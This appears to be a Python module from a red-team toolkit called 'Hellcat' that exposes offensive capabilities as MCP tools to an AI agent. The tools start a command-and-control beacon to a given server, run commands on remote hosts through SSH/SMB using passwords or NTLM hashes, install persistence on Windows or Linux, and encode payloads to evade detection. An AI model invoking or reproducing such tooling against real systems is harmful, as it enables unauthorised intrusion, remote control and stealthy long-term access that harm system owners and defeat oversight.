"""Hellcat Red Team Handler — C2/lateral/persist/evasion MCP tools."""
from __future__ import annotations
import logging
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from fastmcp import FastMCP
    from hellcat.hellcat_mcp import ToolCounter

def register_redteam_tools(mcp: FastMCP, counter: ToolCounter, logger: logging.Logger) -> None:
    @mcp.tool()
    def c2_beacon_start(server: str, port: int = 443, interval: float = 60) -> dict:
        """Start a C2 beacon."""
        from hellcat.core.c2 import Beacon, BeaconConfig
        cfg = BeaconConfig(server=server, port=port, interval=interval)
        b = Beacon(cfg)
        b.start()
        return {"status": "started", "beacon_id": b.info.beacon_id}

    @mcp.tool()
    def lateral_move(target: str, username: str, password: str = "", ntlm_hash: str = "", command: str = "whoami") -> dict:
        """Execute command on remote host via SSH/SMB.
        Requires valid credentials. Timeout: 15s connection.
        Example: lateral_move(target="10.0.0.2", username="admin", password="<password>")"""
        from hellcat.core.lateral import auto_lateral, LateralConfig
        from hellcat.core.models import Credentials
        creds = Credentials(username=username, password=password or None, ntlm_hash=ntlm_hash or None)
        config = LateralConfig(timeout=15.0)
        mod = auto_lateral(target, creds, config)
        if not mod:
            return {"success": False, "error": "No suitable lateral module for these credentials"}
        try:
            if not mod.connect():
                return {"success": False, "error": f"Connection to {target} failed (timeout 15s)", "module": mod.name}
            result = mod.execute(command, timeout=15.0)
            mod.disconnect()
            return result.to_dict()
        except Exception as exc:
            return {"success": False, "error": str(exc), "module": mod.name}

    @mcp.tool()
    def persist_install(method: str, payload: str, os_type: str = "linux", name: str = "") -> dict:
        """Install persistence mechanism."""
        from hellcat.core.persistence import PersistenceGenerator, PersistenceType
        try:
            pt = PersistenceType(method)
        except ValueError:
            return {"error": f"Unknown method: {method}"}
        if os_type == "windows":
            return PersistenceGenerator.generate_windows(pt, payload, name or None)
        return PersistenceGenerator.generate_linux(pt, payload, name or None)

    @mcp.tool()
    def evasion_encode(payload_hex: str, level: str = "medium") -> dict:
        """Encode payload with evasion techniques."""
        from hellcat.core.evasion import EvasionEngine
        from hellcat.core.models import EvasionLevel
        eng = EvasionEngine()
        raw = bytes.fromhex(payload_hex)
        lvl = EvasionLevel(level) if level in [e.value for e in EvasionLevel] else EvasionLevel.MEDIUM
        encoded = eng.encode_payload(raw, lvl)
        import base64
        return {"encoded_b64": base64.b64encode(encoded).decode(), "level": lvl.value, "size": len(encoded)}

    counter.add("redteam", 4)
